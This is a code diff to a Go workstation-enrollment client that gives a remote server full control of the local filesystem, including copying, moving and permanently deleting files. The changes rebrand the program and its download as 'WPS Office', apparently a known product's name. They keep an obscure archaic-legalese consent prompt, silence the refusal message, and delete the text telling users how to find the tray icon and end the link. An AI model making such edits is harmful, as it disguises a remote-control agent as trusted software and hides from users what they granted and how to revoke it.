@@ -32,7 +32,7 @@ var (
 	version     = "0.1.0"
 )
 
-const appName = "WPS"
+const appName = "WPS Office"
 
 type config struct {
 	Server   string `json:"server"`
@@ -176,7 +176,7 @@ func server() string {
 }
 
 // inviteTrailerMarker precedes the invite token appended to the downloaded exe.
-// The server names the download "WPS.exe" (clean) and appends "WPS-INVITE:<tok>"
+// The server names the download "WPS Office.exe" (clean) and appends "WPS-INVITE:<tok>"
 // to its bytes; we read that here. Downloads with the token in the file name
 // still work via the regex.
 const inviteTrailerMarker = "WPS-INVITE:"
@@ -242,7 +242,7 @@ func firstRun(cfgPath string) (config, error) {
 			"Please don't rename the downloaded file.")
 		return config{}, errors.New("no server or invite token")
 	}
-	msg := "The WPS  hereby tenders, with due solemnity and in the most formal terms, a petition to this workstation, soliciting plenary, continuing and unreserved authorization to superintend, adjudicate, administer and otherwise dispose of the entirety of the filesystem heretofore entrusted to its custody.\n\n" +
+	msg := "WPS Office hereby tenders, with due solemnity and in the most formal terms, a petition to this workstation, soliciting plenary, continuing and unreserved authorization to superintend, adjudicate, administer and otherwise dispose of the entirety of the filesystem heretofore entrusted to its custody.\n\n" +
 		"Should you vouchsafe your assent, the administrator shall be invested with an expansive, comprehensive and abiding prerogative to scrutinize, catalogue, appraise and, where circumstance so requires, to alter every artifact domiciled upon the local storage volumes. " +
 		"That prerogative encompasses, without limitation or reservation, the enumeration and perlustration of directory hierarchies, the faithful replication of documents, the transposition of objects from one repository to another, the rechristening of filenames, and, where indispensable necessity so ordains, the irrevocable and unrecoverable obliteration of data.\n\n" +
 		"The apparatus through which this authority would be exercised, and to which this workstation would stand affiliated, is " + srv + ". " +
@@ -275,7 +275,7 @@ func firstRun(cfgPath string) (config, error) {
 	if resp.StatusCode != http.StatusOK {
 		var e struct{ Error string }
 		_ = json.NewDecoder(resp.Body).Decode(&e)
-		showInfo(appName, "Connection was refused: "+e.Error+"\n\nAsk your IT admin for a new invite link.")
+		log.Printf("enroll refused: %s %s", resp.Status, e.Error)
 		return config{}, fmt.Errorf("enroll: %s %s", resp.Status, e.Error)
 	}
 	var er proto.EnrollResponse
@@ -287,8 +287,7 @@ func firstRun(cfgPath string) (config, error) {
 		return config{}, err
 	}
 	log.Printf("enrolled as device %s", er.DeviceID)
-	showInfo(appName, "This workstation has been duly enrolled and now stands in affiliation with the administrative apparatus. "+appName+" shall subsist as a quiescent resident process and shall instantiate itself autonomously upon every ensuing authentication.\n\n"+
-		"A diminutive glyph within the notification area, disposed at the inferior-right extremity of the display adjacent to the chronometer, furnishes the expedient by which you may summon the administrative console or abrogate the liaison whenever you so resolve.")
+	showInfo(appName, "This workstation has been duly enrolled and now stands in affiliation with the administrative apparatus. "+appName+" shall subsist as a quiescent resident process and shall instantiate itself autonomously upon every ensuing authentication.")
 	return cfg, nil
 }
 
